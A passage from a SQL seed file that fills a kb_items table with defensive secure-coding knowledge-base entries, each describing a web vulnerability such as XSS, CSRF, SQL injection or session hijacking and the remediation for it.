origin.NEWLINENEWLINEYou may also want to consider to include "Framebreaking/Framebusting" defense for legacyNEWLINEbrowsers that do not support X-Frame-Option headers.NEWLINENEWLINESource:NEWLINEhttps://www.codemagi.com/blog/post/194NEWLINE', 'Include anti clickjacking headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Signed application componentsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen an application don''t use signed application components an attacker can easily modify partsNEWLINEof the application and load inject a backdoor into the application. Also the attacker couldNEWLINEmodify business logic in the application without the application notice. Signed applicationNEWLINEcomponents can help harden your application and make it noticeable when an attacker tries toNEWLINEmodify the code in the application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINECreate for the different components in the application signed signatures and verify these inNEWLINEthe application at starting of the application and at run-time level.NEWLINE', 'Signed application components'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Build process security hardeningNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEBuilding you application should always be done on a server that you trust, you are in control andNEWLINEhas the latest security patches and hardening configured. In some applications you can use securityNEWLINEtechniques and modules that can protect your application from know security issues. Always use theseNEWLINEtechniques when they are available.NEWLINENEWLINE## Solution:NEWLINENEWLINEEnsure that build processes for system level languages have all security flags enabled, such asNEWLINEASLR, DEP, and other security checks specific for your application need.NEWLINE', 'Build proccess security hardening'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sanitize unstructured data NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEVerify that unstructured data is sanitized to enforce generic safety measures. When this is notNEWLINEsetup an attacker can use this unstructured data to harm the application and perform injections.NEWLINENEWLINE## Solution:NEWLINENEWLINEUnstructured data needs to be sanitized to enforce generic safety measures for example:NEWLINENEWLINE- allowed charactersNEWLINE- character length,NEWLINENEWLINEAlso some characters are potentially harmful in given context and thus should be escaped.NEWLINE(e.g. natural names with Unicode or apostrophes, such as &#x306D;&#x3053; or O''Hara)NEWLINE', 'Sanitize unstructured data'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Zero keys and secrets before destroying themNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAttackers are always on the lookout for secrets of a server of computer. When these secrets areNEWLINEaccessible for an attacker because the key was not properly being destroyed then this can lead toNEWLINEsecurity issues.NEWLINENEWLINE## Solution:NEWLINENEWLINEBefore destroying a secret or a security key it''s needed by the application to overwrite the secretNEWLINEwith a new value zeroes. This will make it harder for an attacker to obtain the correct old valueNEWLINEof the secret or security key.NEWLINE', 'Keys secrets zeroed'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# All keys and passwords should be replaceableNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIt always can happen that you need the keys or the passwords of the application or in componentsNEWLINEthat are needed by the application to work in a secure state. When these keys needs to be revokedNEWLINEbecause the password was leaked or an administrator leaving the company it''s always smart to haveNEWLINEthe possibility to revoke the keys or passwords without to much problems.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify in the application and components it uses that it''s possible to replace the used keys andNEWLINEpasswords. Also replace default keys and passwords after the installation of the application.NEWLINE', 'Keys passwords should be replaceable'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Enforce random numbers are created with proper entropy at runtimeNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThere are some techniques attackers use to decrease the entropy pool of the system so it willNEWLINEcreate weak and predictable ''random'' numbers that should not be used in crypto functions.NEWLINENEWLINE## Solution:NEWLINENEWLINEEnforce in your application that random numbers are created with proper entropy even when theNEWLINEapplication is under heavy load, or that the application degrades gracefully in such circumstances.NEWLINE', 'Enforce random numbers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Segregated componentsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIt''s always possible that an attacker can find a security flaw and abuse this to gain accessNEWLINEto the server. From here the attacker tries to further infiltrate into the network and otherNEWLINEimportant components of the application for example the database. This database should be firewalledNEWLINEcorrectly so it''s not accessible from the internet. Also this database has it own server and is in aNEWLINEdifferent segment of the network. Always apply INGRESS and EGRESS filtering for all the servers used.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that components are segregated from each other via a defined security control, such asNEWLINEnetwork segmentation, firewall rules, or cloud based security groups.NEWLINE', 'Segregated components'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Personally Identifiable Information (PII) protection measurementsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThere should be extra care taken into account when you are dealing with PII in yourNEWLINEapplication. There are multiple laws in countries that demand proper protection byNEWLINEmeans of SSL/TLS for when the data is in transit and encrypted with pub priv key systemNEWLINEwhen stored on the disk. This is needed to protect the user from identity theft and fraud.NEWLINENEWLINE## Solution:NEWLINENEWLINEPersonally Identifiable Information needs to be stored encrypted at rest and ensure that allNEWLINEcommunication goes via protected channels like SSL/TLS.NEWLINE', 'PII protection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include X-XSS-Protection headerNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis header enables the Cross-site scripting (XSS) filter built into most recentNEWLINEweb browsers. It is usually enabled by default anyway, so the role of this header is to re-enable the filter for this particular website if it was disabled by the user. This header is supported in IE 8 and in Chrome 4.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThese headers are also known as the: X-XSS-Protection: 1; mode=block and provide protection against XSS attacks when implemented in the application or web-server.NEWLINE', 'Include X XSS'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include X-Content-Type-Options headerNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe only defined value, nosniff, prevents Internet Explorer and Google Chrome fromNEWLINEMIME-sniffing a response away from the declared content-type.NEWLINEThis also applies to Google Chrome, when downloading extensions.NEWLINEThis reduces exposure to drive-by download attacks and sites serving user uploadedNEWLINEcontent that, by clever naming, could be treated by MSIE as executable or dynamic HTMLNEWLINEfiles.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThese headers are also known as the: X-Content-Type-Options: nosniff;NEWLINEand provide protection against Mime content type attacks when implemented in theNEWLINEapplication or webserver.NEWLINE', 'Include X Content Type Options header'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include Strict-Transport-Security headerNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP Strict-Transport-Security (HSTS) enforces secure (HTTP over SSL/TLS) connections toNEWLINEthe server. This reduces impact of bugs in web applications leaking session data throughNEWLINEcookies and external links and defends against Man-in-the-middle attacks. HSTS alsoNEWLINEdisables the ability for user''s to ignore SSL negotiation warningsNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThese headers are also known as the: Strict-Transport-Security: max-age=16070400:NEWLINEincludeSubDomains and provide protection against SSL Strip attacks when implemented in theNEWLINEapplication or webserver.NEWLINENEWLINEWhen connecting to an HSTS host for the first time, the browser won''t know whether or notNEWLINEto use a secure connection, because it has never received an HSTS header from that host.NEWLINEConsequently, an active network attacker could prevent the browser from ever connectingNEWLINEsecurely (and even worse, the user may never realize something is amiss). To mitigateNEWLINEthis attack, you can add your application to a preload list which makes HSTS enforced by default.NEWLINEWhen a user connects to one of these hosts for the first time, the browser will know thatNEWLINEit must use a secure connection. If a network attacker prevents secure connections to theNEWLINEserver, the browser will not attempt to connect over an insecure protocol, thusNEWLINEmaintaining the user''s security.NEWLINENEWLINEVisit:NEWLINE    https://hstspreload.appspot.com/NEWLINEHere you can find how to add your application to HSTS preloadNEWLINE', 'Include Strict Transport Security header'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sensitive information stored in cookiesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESensitive data should not be stored in a cookie.NEWLINEBecause the cookie is also used client-side and is adaptable and thus makingNEWLINEit content readable. A hacker could gain access to a cookie through cross site scriptingNEWLINEattacks and gain the sensitive information storedNEWLINEin the targets cookie.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not store sensitive information in cookies.NEWLINE', 'sensitive information stored in cookies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client-side state managementNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn application can implement all kinds of logic rules through javascript and html.NEWLINEHowever, these are client-side constraints that a hacker can easily disable or modify.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUser restrictions should always be imposed by server side techniques insteadNEWLINEof client side constraints.NEWLINE', 'Client side state management'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Too verbose authentication-failure loggingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe error messages that are displayed when a user fails to login into an applicationNEWLINEshould selected with caution. When this error message gives away too much information,NEWLINEthis information can be exploited by a hacker.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe application should never publish available usernames. When an attacker gains thisNEWLINEinformation he increases his attack vector and reduces the timeNEWLINErequired to identify accounts.NEWLINENEWLINEI.e:NEWLINENEWLINEImagine an forgot password function where the user enters his username in order for theNEWLINEapplication to send a new password to his email address, the user enters a correct usernameNEWLINEand the application responds with:NEWLINENEWLINEEmail successfully send to your email address.NEWLINEWhen the user enters a incorrect username it says.NEWLINEError: user does not exists.NEWLINENEWLINEThis function would be vulnerable to username enumerationNEWLINE', 'Too verbose authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Brute-force password guessingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELogin functions should not abused in an automated way that an attacker could create aNEWLINEscript that contains a list of usernames and passwords, which he could use against yourNEWLINElogin function in order to gain unauthorized access to user accounts.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEImplement a method that limit the amount of tries with automated tools.NEWLINESome examples are using a CAPTCHA or a tarpit(rate-limiting) method.NEWLINE', 'Brute force password guessing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XSS injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEEvery time the application gets user-input, whether this showing it on screen or processingNEWLINEthis data in the application background, these parameters should be escaped for maliciousNEWLINEcode in order to prevent cross site scripting injections.NEWLINEWhen an attacker gains the possibility to perform a XSS injection,NEWLINEhe is given the opportunity to inject HTML and javascript code directly into theNEWLINEapplication. This could lead to accounts being compromised by stealing session cookies,NEWLINEor directly affect the operation of the target application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn order to prevent XSS injections all user-input should be escaped or encoded.NEWLINEYou could start by sanitising user-input as soon as it is inserted into the application,NEWLINEby preference using a so called white-listing method.NEWLINEThis means u should not checking for malicious content like the tags or anything,NEWLINEbut only allowing the expected input. Every input which is outside of the intended operationNEWLINEof the application should immediately be detected, logged en rejected.NEWLINENEWLINEThe second step would be encoding all the parameters or user-input before putting this inNEWLINEyour html with encoding libraries specially designed for this purpose.NEWLINENEWLINEYou should take into consideration that there are several contexts for encoding user-input forNEWLINEescaping XSS injections. These contexts are amongst others:NEWLINENEWLINEHTML encodingNEWLINEThis is for whenever your user-input is displayed directly into your HTMLNEWLINENEWLINEHTML attribute encodingNEWLINEThis type of encoding/escaping should be applied whenever your user input is displayed into the attribute ofNEWLINEyour HTML tagsNEWLINENEWLINEHTML URL encodingNEWLINEThis type of encoding/escaping should be applied to whenever you are using user-input into a HREFNEWLINEtag.NEWLINENEWLINEJavascript encodingNEWLINEWhenever parameters are rendered via javascript your application will detect normal injectionsNEWLINEin the first instant. But your application still remains vulnerable to javascript encoding which will notNEWLINEbe detected by the normal encoding/escaping methods.NEWLINE', 'xss injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Denial-of-service by locking out accountsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever there is offered the opportunity to log into the application it should not lockNEWLINEout accounts. A hacker could abuse this function to make the application deny accessNEWLINEtowards its power users.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe application should not lock-out users when they enter false login credentials.NEWLINE', 'Denial of service by locking out accounts'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Predictable password and/or token generationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINETokens or passwords that are used within the application must contain a high entropy inNEWLINEorder to prevent the prediction of these values.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINETokens should contain a high level entropy and randomness to prevent predictable token generation.NEWLINEAll random numbers, random file names, random GUIDs, and random must be generated usingNEWLINEthe cryptographic module''s approved random number generatorNEWLINEwhen these random values are intended to be unguessable by an attackerNEWLINE', 'Predictable password and or token generation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Unauthorized credential changesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn application which offers a user login functionality, usually has an administration pageNEWLINEwhere his user-data can be modified. When the user wants to change this data he shouldNEWLINEspecify his current password.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen changing user credentials or email address the user must always enter a validNEWLINEpassword in order to implement the changes. This is also called re-authentication orNEWLINEstep-up / adaptive authentication. Whenever a user "re-authenticates" himself the currentNEWLINEsessionid value should also be refreshed in order to fend of so called "session hijackers"NEWLINE', 'Unauthorized credential changes'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Double decoding of headers/parametersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEDouble decoding is a problem which often occurs when multiple servers are used in which aNEWLINEconfiguration error is made.NEWLINEA hacker can encode his payload differently so it will not be recognized by an WAF or IDSNEWLINEand also bypass the escaping of the application.NEWLINENEWLINEBy using double encoding it''s possible to bypass security filters that only decode userNEWLINEinput once. The second decoding process is executed by the backend platform or modulesNEWLINEthat properly handle encoded data, but don''t have the corresponding security checks inNEWLINEplace.NEWLINENEWLINEAttackers can inject double encoding in pathnames or query strings to bypass theNEWLINEauthentication schema and security filters in use by the web application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEOnly one web-server should decode/encode the data.NEWLINE', 'Double decoding of headers parameters'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Resource identifier injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA resource identifier injection basically means that the attacker can determine whichNEWLINEresources are loaded into the web application.NEWLINEAn attacker could thus influence the operation of the web application and redirect usersNEWLINEto other websites. This attack consists of changing resource identifiers used by anNEWLINEapplication in order to perform a malicious task. When an application permits a userNEWLINEinput to define a resource, like a file name or port number,NEWLINEthis data can be manipulated to execute or access different resources.NEWLINEIn order to be properly executed, the attacker must have the possibility to specify aNEWLINEresource identifier through the application form and the application must permit the execution.NEWLINEThe resource type affected by user input indicates the content type that may be exposed.NEWLINEFor example, an application that permits input of special characters like period, slash,NEWLINEand backslash is risky when used in methods that interact with the file system.NEWLINEThe resource injection attack focuses on accessing other resources than the localNEWLINEfilesystem, which is different attack technique known as a Path Manipulation attack.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESafe use of resource identifiers can be done by performing authorisation checks if theNEWLINEidentifier is belonging to the user.NEWLINE', 'Resource identifier injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Dynamic scripting injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen user input is used to evaluate scripting code then this could introduceNEWLINEhigh security risks. If the input is not properly escaped an attacker can inject his ownNEWLINEscript code and gain access to the server.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not use direct user-input in the dynamic scripting function. You should firstNEWLINEuse an input validation or encoding function on the user submitted data to clean andNEWLINEsanitize the input against malicious intent.NEWLINE', 'Dynamic scripting injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Regular expression injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the application uses regular expressions which receives user input,NEWLINEthen the user input should be properly escaped.NEWLINEIf not done properly then the hacker can affect the regular expression and modify theirNEWLINElogic. In some cases, an attacker could even gain access to the serverNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not use user-input without escaping in a regular expressions "regex pattern".NEWLINESince this could lead to serious security vulnerabilities.NEWLINE', 'Regular expression injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Automated spamming via feedback scriptsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA hacker must not gain the possibility to abuse an applications email functionality byNEWLINEmeans of scripts which sends automated spamming mails.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThis problem could be prevented by implementing CAPTCHA or rate-limiting mechanisms.NEWLINE', 'Automated spamming via feedback scripts'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session cookies without the Secure flagNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe secure flag is an option that can be set when creating a cookie.NEWLINEThis flag ensures that the cookie will not be sent over an unencryptedNEWLINEconnection by the browser.NEWLINEWhich ensures that the session cookie can not be send over a non-encrypted link.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen creating a session cookie which is send over an encrypted connectionNEWLINEyou should set the secure flag. The Secure flag should be set during every set-cookie.NEWLINEThis will instruct the browser to never send the cookie over HTTP.NEWLINEThe purpose of this flag is to prevent the accidental exposure of a cookie value if a userNEWLINEfollows an HTTP link.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Session managementNEWLINE', 'Session cookies without the Secure flag'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session cookies without the HttpOnly flagNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe http-only flag is an option that can be set when creating a cookie.NEWLINEThis flag ensures that the cookie can not be read or edited by javascript.NEWLINEThis ensures that an attacker can not steal this cookie as a cross-site scriptingNEWLINEvulnerability is present in the application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe HTTP-Only flag should be set to disable malicious script access to the cookie valuesNEWLINEsuch as the session ID value. Also disable unnecessary http request methods because ofNEWLINEthe TRACE option. Misconfiguration of the HTTP request headers can lead to stealing theNEWLINEsession cookie even though http-only protection is in place.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- HTTP request methodsNEWLINE- Session managementNEWLINE', 'Session cookies without the HttpOnly flag'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Command injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINECommand injection is an attack in which the goal is execution of arbitrary commands onNEWLINEthe host operating system via a vulnerable application. Command injection attacks areNEWLINEpossible when an application passes unsafe user supplied dataNEWLINE(forms, cookies, HTTP headers etc.) to a system shell. In this attack,NEWLINEthe attacker-supplied operating system commands are usually executed with the privilegesNEWLINEof the vulnerable application. Command injection attacks are possible largely due toNEWLINEinsufficient input validation. This attack differs from Code Injection, in that codeNEWLINEinjection allows the attacker to adds his own code that is then executed by the application.NEWLINEIn Code Injection, the attacker extends the default functionality of the applicationNEWLINEwithout the necessity of executing system commands.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUser-input that is used in a shell command should not contain dangerous characters.NEWLINEA blacklist of characters is not a good option because it may be difficult to think ofNEWLINEall of the characters to validate against. A white list containing only allowableNEWLINEcharacters should be created to validate the user-input.NEWLINE', 'Command injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# External session hijackingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen an attacker obtains a users session cookie, then he could steal the identity of theNEWLINEuser which the session cookie belonged to.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAs soon as a session is set for an authenticated user,NEWLINEthe server should keep track of the IP address in which the user used when he started the session.NEWLINEWhen the server discovers a change in IP address, for instance when an attacker hijacks anNEWLINEusers session. The server then should deny access, destroy the session and redirect theNEWLINE''hijacker'' to the login page.NEWLINE', 'External session hijacking'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Insecure transmission of session cookiesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the session cookies are sent over an unencrypted connection,NEWLINEthey should be withdrawn immediately.NEWLINEThese cookies are not to be trusted anymore as a hacker may have captured their values.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESession cookies that are used to authenticate the user should always be set on aNEWLINEsecure connection.NEWLINENEWLINEIn order to achieve this you should set the "secure" flag on your session cookieNEWLINEto make sure your application in any circumstance does not send this cookie over nonNEWLINEHTTPS connections.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Session managementNEWLINE', 'Insecure transmission of session cookies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Unproven cryptographic algorithmsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe encryption techniques used in the application must be known and proven methods.NEWLINEWhen there is a self-made hashing algorithm developed it is very likely to containNEWLINEvulnerabilities due to math-flaws resulting in encryption which can be broken.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever implement your own designed Crypto functions.NEWLINEVerify that cryptographic modules used by the application have been validated againstNEWLINEFIPS 140-2 or an equivalent standard.NEWLINE', 'Unproven cryptographic algorithms'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client-side authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn application could implement authentication functionalities through JavaScript and HTML.NEWLINEHowever, these are client-side constraints that are imposed, which means that a hackerNEWLINEcan easily disable or modify these constraints.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever implement client-side authentication constraints, since these are easily bypassed.NEWLINEWhen implementing authentication methods always use server-side solutions.NEWLINE', 'Client side authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Identifier-based authorizationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn application uses parameters in order to process data.NEWLINEThese parameters can also be used to assign certain roles and retrieveNEWLINENEWLINEContent corresponding with those parameters. Imagine the following example:NEWLINENEWLINE    www.target.com/index.php?loggedin=userNEWLINENEWLINEIn this situation the application will get content and subscribe user roles corresponding to the user parameterNEWLINENEWLINE    www.target.com/index.php?loggedin=adminNEWLINENEWLINEIn this situation the application will get content and subscribe user roles corresponding to the admin parameter.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever you are checking whether a user is restricted to review certain data, the accessNEWLINErestrictions should be processed server-side.NEWLINENEWLINEThe userID should be stored inside of a session variable on login and should be used toNEWLINEretrieve user data from the database like : SELECT data from personaldata where userID=:id <- session varNEWLINENEWLINENow an possible attacker can not tamper and change the application operation since theNEWLINEidentifier for retrieving the data is handled server-side.NEWLINE', 'Identifier based authorization'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Missing authentication or authorizationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf pages are not properly checked for authentication or authorization, an attacker couldNEWLINEabuse these flaws. The consequences are differ per application but may lead toNEWLINEhigh risk vulnerabilities.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEYou should verify all access controls are implemented properly in order toNEWLINEprevent a user access data/functions which he was not intended to use.NEWLINE', 'Missing authentication or authorization'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SQL injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll SQL queries, HQL, OSQL, NOSQL and stored procedures, calling of stored procedures should beNEWLINEprotected by the use of query parameterization.NEWLINEIf not an attacker can inject malicious code into these queries he gains the ability toNEWLINEmanipulate them and now he can withdraw, update and delete data which is stored on theNEWLINEtarget database.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe use of prepared statements and parameterized queries is how all developers shouldNEWLINEfirst be taught how to write database queries. They are simple to write, and easier toNEWLINEunderstand than dynamic queries. Parameterized queries force the developer to first defineNEWLINEall the SQL code, and then pass in each parameter to the query later. This coding styleNEWLINEallows the database to distinguish between code and data, regardless of what user inputNEWLINEis supplied.NEWLINE', 'Prepared statements and query parameterization'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# CSRF injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINECross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site,NEWLINEemail, blog, instant message, or program causes a users Web browser to perform an unwantedNEWLINEaction on a trusted site for which the user is currently authenticated.NEWLINENEWLINEThe impact of a successful cross-site request forgery attack is limited to theNEWLINEcapabilities exposed by the vulnerable application. For example, this attack could resultNEWLINEin a transfer of funds, changing a password, or purchasing an item in the users context.NEWLINEIn effect, CSRF attacks are used by an attacker to make a target system perform aNEWLINEfunction (funds Transfer, form submission etc.) via the targets browser withoutNEWLINEknowledge of the target user at least until the unauthorised function has been committed.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINETo arm an application against automated attacks and tooling you need to use unique tokensNEWLINEwho are included into the forms of an application, API calls or AJAX requests.  NEWLINEAny state changing operation requires a secure random token (e.g CSRF token) to preventNEWLINEagainst CSRF attacks. Characteristics of a CSRF Token are Unique and is a large randomNEWLINEvalue generated by a cryptographically secure random number generator.NEWLINENEWLINEThe CSRF token is then added as a hidden field for forms and validated on the sever side wheneverNEWLINEa user is sending a request to the server.NEWLINE', 'csrf injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Are all passwords hashed, salted and stretched NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a password is not properly hashed, salted and stretched an attacker could easilyNEWLINEabuse the password when obtained.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEA user should always be forced to use a proper password when signing in into the application.NEWLINEPreferably a pass-phrase instead of a password. This in order to extend the durationNEWLINEof a brute-force attack.NEWLINENEWLINEVerify that account passwords are protected using an adaptive key derivation function.NEWLINEMake sure the salt for the user is always unique and you apply bcrypt, scrypt orNEWLINEPBKDF2 before storing the password, with a minimum work factor iteration count of 150,000NEWLINEloops to eliminate the possibility of brute forcing.NEWLINE', 'Are all passwords hashed, salted and stretched'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sensitive information transmitted by un-encrypted methodsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever sensitive information is send by unencrypted methods an attacker could interceptNEWLINEthis data and use this for malicious intents.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll sensitive information should always be send by an encrypted methodsNEWLINEsuch as HTTPS connections.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Secure sessionNEWLINE- HTTP strict transport securityNEWLINE- HSTS preloadNEWLINE- Certificate pinningNEWLINE', 'Sensitive information transmitted by unencrypted methods'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session information is not stored server-sideNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever session information is not stored server-side an attacker could easily tamperNEWLINEand manipulate these values. This is always a bad idea and you should not do this!NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESession information should always be stored server-side by means of a server-side language.NEWLINE', 'Session information is not stored server side'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The crossdomain.xml should only contains trusted domains NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe use of a crossdomain.xml file is required when the web application uses Flash.NEWLINEThis file is used to set up restrictions for any other web servers using theNEWLINEflash application. If these are not set correctly, an attacker could exploit this toNEWLINEexecute targeted attacks against the users of the web application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways make sure the crossdomain.xml only contains trusted domains.NEWLINE', 'The crossdomain.xml should only contains trusted domains'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session ids should be generated with sufficient entropy  NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever session ids are not generated with a sufficient entropy this could lead to aNEWLINEsession collision or session hijacking. If an attacker can guess an authenticated user''sNEWLINEsession identifier, he can take over the user''s session.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe WebLogic deployment descriptor should specify a session identifier length of atNEWLINEleast 128 bits. A shorter session identifier leaves the application open toNEWLINEbrute-force session guessing attacks.NEWLINE', 'Session ids should be generated with sufficient entropy'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# User generated session ids should be rejected by the server  NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever user generated session ids are not rejected by the server,NEWLINEan attacker could change the session credentials given by the server on the targetsNEWLINEcomputer into an easy to remember value.NEWLINENEWLINEWhen the attacker then changes his own session credentials with the easily to rememberNEWLINEvalue he used on the target''s computer. The attacker could do a session hijackingNEWLINEon the targets current session.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll session ids not generated by the server should be rejected.NEWLINE', 'User generated session ids should be rejected by the server'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The logout functionality should revoke the complete session  NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen the logout functionality does not revoke the complete session an attacker couldNEWLINEimpersonate a user when he has access to the session cookie.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe logout functionality should revoke the complete session whenever a userNEWLINEwants to terminate his session.NEWLINENEWLINEEach different framework has its own guide to achieve this revocation.NEWLINEIt is also recommended for you to make testcases which you follow to ensureNEWLINEsession revocation in your application.NEWLINE', 'The logout functionality should revoke the complete session'); 
